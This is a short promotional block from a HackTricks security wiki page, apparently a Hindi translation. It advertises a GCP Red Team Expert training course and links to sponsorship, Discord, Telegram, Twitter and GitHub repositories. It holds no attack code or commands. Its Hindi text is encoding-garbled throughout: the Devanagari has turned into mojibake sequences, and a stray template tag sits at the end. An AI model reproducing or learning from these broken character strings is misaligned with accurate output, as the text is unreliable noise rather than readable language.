GCP Hacking ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡•ã ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§¶‡•á‡§Ç</summary>

* [**subscription plans**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**telegram group**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ **Twitter** üê¶ ‡§™‡§∞ ‡§π‡§Æ‡•á‡§Ç **‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos ‡§Æ‡•á‡§Ç‡•§

</details>
{% endhint %}
